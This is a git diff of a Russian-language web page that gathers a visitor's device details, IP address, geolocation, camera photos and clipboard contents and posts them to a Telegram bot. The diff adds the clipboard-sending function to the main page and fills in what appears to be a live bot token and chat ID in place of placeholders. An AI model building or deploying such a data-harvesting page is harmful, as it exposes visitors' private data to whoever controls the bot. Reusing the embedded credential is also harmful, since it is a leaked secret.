@@ -10,6 +10,9 @@
     <p>Информация о вашем устройстве и IP-адрес будет отправлена в Telegram-бот.</p>
 
     <button onclick="takePhoto()">Сделать фото</button>
+    <h1>Отправка Данных из Буфера Обмена</h1>
+    <p>Содержимое вашего буфера обмена будет отправлено в Telegram-бот.</p>
+    <button onclick="sendClipboardData()">Отправить данные из буфера обмена</button>
 
 <script>
     async function getDeviceBrandAndModel() {
@@ -393,21 +396,7 @@
         getGeolocation();
         
     </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправка Буфера Обмена</title>
-</head>
-<body>
-    <h1>Отправка Данных из Буфера Обмена</h1>
-    <p>Содержимое вашего буфера обмена будет отправлено в Telegram-бот.</p>
-    <button onclick="sendClipboardData()">Отправить данные из буфера обмена</button>
-
-    <script>
+       <script>
         async function sendClipboardData() {
             try {
                 // Получение всех данных из буфера обмена
@@ -477,8 +466,8 @@
         }
 
         function sendImageToTelegram(imageBlob) {
-            const botToken = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
-            const chatId = 'YOUR_CHAT_ID'; // Замените на ваш Chat ID
+            const botToken = '7305121459:AAFzETELl_xUVTb5wvWPixxU27BQzygYYdk'; // Замените на токен вашего бота
+            const chatId = '1653222949'; // Замените на ваш Chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
             const formData = new FormData();
